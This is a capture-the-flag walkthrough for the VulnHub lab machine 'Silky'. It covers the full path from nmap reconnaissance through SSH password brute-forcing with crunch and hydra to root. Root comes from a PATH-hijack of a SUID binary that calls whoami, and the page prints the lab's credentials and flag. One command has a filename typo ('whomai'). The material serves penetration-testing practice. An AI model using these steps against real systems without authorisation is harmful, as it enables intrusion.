Silky

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content discovery
[+] Crunch password creation with missing 2 chars
[+] Privilege Escalation Abusing PATH Variables -  whoami
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nmap Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-28 00:55 EST
Nmap scan report for 192.168.56.102
Host is up (0.00070s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 49:e6:fa:4c:d5:60:06:3b:c0:a8:c9:cc:00:10:7e:04 (RSA)
|   256 29:1b:39:69:32:aa:ae:9f:72:83:29:d4:27:db:f8:af (ECDSA)
|_  256 a0:05:9e:82:bc:9d:09:ce:8e:c5:40:b2:b2:93:c6:53 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/notes.txt
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:E4:6B:46 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.70 ms 192.168.56.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Investigating Robots.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/silky# curl http://192.168.56.102/robots.txt
User-agent: UniversalRobot/1.0
User-agent: mein-Robot

User-agent: *
Disallow: /notes.txt


root@setrus:~/vulnhub/silky# curl http://192.168.56.102/notes.txt
Ich muss unbedingt das Passwort aus der Seite entfernen, immerhin fehlen die letzten 2 Zeichen. Aber trotzdem.
root@setrus:~/vulnhub/silky# 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After transaltion we get

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
I must necessarily remove the password from the page, after all, missing the last 2 characters. But still.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Finding Script.js

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/silky# curl http://192.168.56.102/script.js
//  s1lKy 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Generating passwords from strings ‘s1lKy’ We don't knwo the last 2 chars. Crunch will come in handy.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/silky# crunch 7 7 -t s1lKy^% >> pass.txt
Crunch will now generate the following amount of data: 2640 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 330 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Identifying the password fir silky

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/silky# hydra -t 1 -l silky -P pass.txt ssh://192.168.56.102
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-28 05:31:26

[DATA] attacking ssh://192.168.56.102:22/
[22][ssh] host: 192.168.56.102   login: silky   password: s1lKy#5
1 of 1 target successfully completed, 1 valid password found


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Connecting as silky  : s1lKy#5


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/silky# ssh silky@192.168.56.102
silky@192.168.56.102's password: 
Linux Silky-CTF 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 14 04:04:41 2019 from 192.168.178.22
silky@Silky-CTF:~$ id
uid=1000(silky) gid=1000(silky) Gruppen=1000(silky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),119(scanner)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Rrivilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
silky@Silky-CTF:~$ find / -perm -4000 -type f 2>/dev/null
/bin/su
/bin/ping
/bin/mount
/bin/umount
/bin/ntfs-3g
/bin/fusermount
/usr/bin/newgrp
/usr/bin/sky
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

/usr/bin/sky file of interest

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
silky@Silky-CTF:~$ /usr/bin/sky
Seide ist ein tierischer Faserstoff. Sie wird aus den Kokons der Seidenraupe, der Larve des Seidenspinners, gewonnen. 
gezeichnet:
root
silky@Silky-CTF:~$ strings /usr/bin/sky
/lib64/ld-linux-x86-64.so.2
04I0KBY
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
AWAVA
AUATL
[]A\A]A^A_
echo 'Seide ist ein tierischer Faserstoff. Sie wird aus den Kokons der Seidenraupe, der Larve des Seidenspinners, gewonnen. 
gezeichnet:';   whoami

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


The “whoami” is called by the script.
We create a whoami in tmp, add the /tmp to $Path and execute /usr/bin/sky.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
silky@Silky-CTF:/tmp$ echo '/bin/sh' > /tmp/whomai; chmod 777 /tmp/whoami; export PATH=/tmp:$PATH; /usr/bin/sky
Seide ist ein tierischer Faserstoff. Sie wird aus den Kokons der Seidenraupe, der Larve des Seidenspinners, gewonnen. 
gezeichnet:
# id
uid=1000(silky) gid=1000(silky) euid=0(root) Gruppen=1000(silky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),119(scanner)
# cd /root; ls
flag.txt
# cat /root/flag.txt
███████╗██╗██╗     ██╗  ██╗██╗   ██╗      ██████╗████████╗███████╗
██╔════╝██║██║     ██║ ██╔╝╚██╗ ██╔╝     ██╔════╝╚══██╔══╝██╔════╝
███████╗██║██║     █████╔╝  ╚████╔╝█████╗██║        ██║   █████╗  
╚════██║██║██║     ██╔═██╗   ╚██╔╝ ╚════╝██║        ██║   ██╔══╝  
███████║██║███████╗██║  ██╗   ██║        ╚██████╗   ██║   ██║     
╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝         ╚═════╝   ╚═╝   ╚═╝     
                                                                  


flag: 489ca3ccb71640cce1a618a5dea48c25



Congrats ;)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



